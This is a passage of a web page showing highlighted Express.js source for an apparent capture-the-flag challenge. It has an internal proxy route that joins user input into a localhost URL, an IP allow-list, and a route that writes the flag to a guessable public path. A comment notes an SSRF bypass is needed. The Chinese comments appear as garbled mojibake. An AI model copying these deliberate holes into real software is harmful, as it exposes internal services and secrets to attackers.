&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/proxy/internal_website/:page&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">page&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬æç¤º
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å…ˆè½¬å°å†™å†åˆ¤æ–­ ä¸èƒ½æœ‰flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// ç™½åå•å®¡æŸ¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;available_endpoints&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">endpoints&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:5000/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#75715e">// è¿”å›ç»“æœ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;The resource not found.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Got error: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è¿”å›æŠ¥é”™åŸå› 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ£€æŸ¥ipæ˜¯å¦ä¸ºæœ¬åœ°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unauthorized&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">contents&lt;/span> &lt;span style="color:#75715e">// è¿”å›æºç 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/:token&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">token&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// é•¿åº¦å¤§äº10å›æ˜¾ip
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public/temp/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å°†flagå†™å…¥public/temp/md5(ip+token)è·¯å¾„ä¸‹ è·¯å¾„å¯æ§ ä½†æ˜¯è®¿é—®æœ¬èº«å—é™ éœ€è¦SSRFç»•è¿‡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
